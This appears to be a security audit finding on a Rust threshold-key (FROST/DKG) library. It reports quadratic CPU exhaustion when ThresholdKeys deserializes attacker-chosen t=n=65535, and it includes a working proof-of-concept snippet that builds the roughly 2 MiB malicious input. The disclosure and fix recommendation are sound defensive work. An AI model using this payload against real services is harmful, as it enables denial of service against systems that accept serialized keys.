### Title
Quadratic CPU exhaustion during `ThresholdKeys` deserialization - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-controlled `t` and `n` values up to `u16::MAX`, then calls `ThresholdKeys::new` before enforcing any application-specific participant limit. For Lagrange interpolation, `ThresholdKeys::new` evaluates `interpolation_factor` for each of the first `t` participants, while every evaluation iterates over all `t` participants. A roughly 2 MiB serialized key with `t = n = 65535` therefore causes billions of field operations during deserialization. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`ThresholdKeys::read` reads `t`, `n`, and `i` directly from the input and permits any nonzero `t <= n <= 65535`. It then reads `n` verification shares and calls `ThresholdKeys::new`. [1](#0-0) 

For Lagrange interpolation, `interpolation_factor` performs a full scan of `included`, multiplying one numerator and denominator term for every other participant. [4](#0-3)  `ThresholdKeys::new` invokes that quadratic operation once for every participant in `1..=t` to derive `group_key`. [3](#0-2) 

Because the participant count is controlled by the serialized input, an input declaring the maximum `t = n = 65535` triggers `65535²` inner-loop iterations before `ThresholdKeys::read` can return.

### Impact Explanation
This is a remotely triggerable CPU denial of service wherever serialized `ThresholdKeys` are accepted from untrusted input. The victim performs billions of field operations and tens of thousands of field inversions for a small serialized object, monopolizing the worker handling the deserialization. Repeated submissions can exhaust available compute capacity. [5](#0-4) [3](#0-2) 

### Likelihood Explanation
The payload requires only canonical encodings and does not need to represent a useful or previously distributed key. All participant identifiers are generated internally as `1..=n`, and repeated valid generator encodings satisfy the deserialization checks. The vulnerable computation occurs automatically inside `ThresholdKeys::new` before any additional caller-side policy check can reject the oversized participant set. [5](#0-4) [6](#0-5) 

### Recommendation
Enforce a protocol-appropriate maximum participant count before reading or processing `n` verification shares. Replace the per-participant `O(t)` Lagrange calculation with a batched interpolation algorithm, such as computing all coefficients through shared products and batch inversion, so large valid sets have near-linear rather than quadratic cost. If large thresholds must remain supported, perform deserialization and key construction under an explicit CPU/resource limit.

### Proof of Concept
The following input uses `t = n = u16::MAX`, participant `i = 1`, Lagrange interpolation, and repeated generator encodings as verification shares:

```rust
use frost::{
  curve::{Ciphersuite, Secp256k1},
  ThresholdKeys,
};
use ciphersuite::group::{ff::{Field, PrimeField}, Group, GroupEncoding};

let mut bytes = Vec::new();

// Curve identifier header expected by ThresholdKeys::read.
bytes.extend_from_slice(
  &u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes(),
);
bytes.extend_from_slice(Secp256k1::ID);

// t = n = 65535 and i = 1.
bytes.extend_from_slice(&u16::MAX.to_le_bytes());
bytes.extend_from_slice(&u16::MAX.to_le_bytes());
bytes.extend_from_slice(&1u16.to_le_bytes());

// Interpolation::Lagrange.
bytes.push(1);

// Canonical secret share.
bytes.extend_from_slice(
  <Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref(),
);

// 65535 canonical, non-identity verification shares.
let generator = Secp256k1::generator().to_bytes();
for _ in 0 .. u16::MAX {
  bytes.extend_from_slice(generator.as_ref());
}

// Performs 65535 interpolation evaluations, each scanning 65535 participants.
let _ = ThresholdKeys::<Secp256k1>::read(&mut bytes.as_slice());
```

The serialized object is only about 2 MiB, but construction executes approximately 4.3 billion inner-loop field operations.

### Citations

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L355-365)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }
```

**File:** crypto/dkg/src/lib.rs (L376-379)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

```

**File:** crypto/dkg/src/lib.rs (L591-631)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
